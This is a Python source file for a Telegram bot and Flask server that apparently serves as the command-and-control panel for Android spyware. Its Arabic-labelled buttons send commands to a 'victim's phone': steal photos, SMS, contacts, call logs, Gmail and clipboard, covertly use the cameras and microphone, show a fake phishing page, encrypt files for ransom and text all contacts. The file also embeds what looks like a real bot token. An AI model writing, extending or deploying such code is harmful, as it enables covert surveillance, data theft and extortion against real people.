import telebot
from flask import Flask
from telebot import types
import threading

# معلوماتك الجديدة يا يوسف
TOKEN = "8788057411:AAFt0eEO19-QVKSchKaIky9raKY11QnVEyQ"
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

current_command = "WAIT"

@bot.message_handler(commands=['start'])
def control_panel(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    # قائمة الأزرار الشاملة (22 زر)
    btns = [
        types.InlineKeyboardButton("▶️ تشغيل الصوت", callback_data='START_AUDIO'),
        types.InlineKeyboardButton("🛑 ايقاف الصوت", callback_data='STOP_AUDIO'),
        types.InlineKeyboardButton("📸 سحب الصور", callback_data='GET_PHOTOS'),
        types.InlineKeyboardButton("🎥 سحب الفيديوهات", callback_data='GET_VIDEOS'),
        types.InlineKeyboardButton("📂 عرض الملفات", callback_data='LIST_FILES'),
        types.InlineKeyboardButton("📋 سجل الحافظة", callback_data='GET_CLIPBOARD'),
        types.InlineKeyboardButton("📞 سجل المكالمات", callback_data='GET_CALLS'),
        types.InlineKeyboardButton("💬 سحب SMS", callback_data='GET_SMS'),
        types.InlineKeyboardButton("👥 جهات الاتصال", callback_data='GET_CONTACTS'),
        types.InlineKeyboardButton("📧 رسائل جيميل", callback_data='GET_GMAIL'),
        types.InlineKeyboardButton("📸 كيمرا أمامية", callback_data='TAKE_FRONT_PHOTO'),
        types.InlineKeyboardButton("📸 كيمرا خلفية", callback_data='TAKE_BACK_PHOTO'),
        types.InlineKeyboardButton("🖥️ لقطة شاشة", callback_data='SCREENSHOT'),
        types.InlineKeyboardButton("🎙️ تسجيل صوت", callback_data='RECORD_AUDIO'),
        types.InlineKeyboardButton("🦔 اظهار اشعارات", callback_data='SHOW_NOTIF'),
        types.InlineKeyboardButton("🛑 ايقاف الاشعارات", callback_data='STOP_NOTIF'),
        types.InlineKeyboardButton("‼️ صفحة مزورة", callback_data='FAKE_PAGE'),
        types.InlineKeyboardButton("😎 رسالة Toast", callback_data='SHOW_TOAST'),
        types.InlineKeyboardButton("⚠️ تشفير ملفات", callback_data='ENCRYPT_FILES'),
        types.InlineKeyboardButton("☎️ اتصال مباشر", callback_data='CALL_PHONE'),
        types.InlineKeyboardButton("📳 اهتزاز", callback_data='VIBRATE')
    ]
    
    markup.add(*btns)
    btn_all_sms = types.InlineKeyboardButton("💬 ارسال SMS للكل", callback_data='SMS_ALL')
    markup.add(btn_all_sms)

    bot.send_message(message.chat.id, "🎛️ لوحة التحكم الجاهزة - القائد يوسف:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    global current_command
    current_command = call.data
    bot.answer_callback_query(call.id, f"تم إرسال أمر: {call.data}")
    bot.send_message(call.message.chat.id, f"📡 جاري انتظار تنفيذ [ {call.data} ] من هاتف الضحية...")

@app.route('/get_command')
def get_command():
    global current_command
    cmd = current_command
    current_command = "WAIT"
    return cmd

@app.route('/')
def home():
    return "Server is Running!"

if __name__ == '__main__':
    # تشغيل البوت والسيرفر معاً
    t = threading.Thread(target=lambda: bot.infinity_polling(none_stop=True))
    t.daemon = True
    t.start()
    app.run(host='0.0.0.0', port=10000)
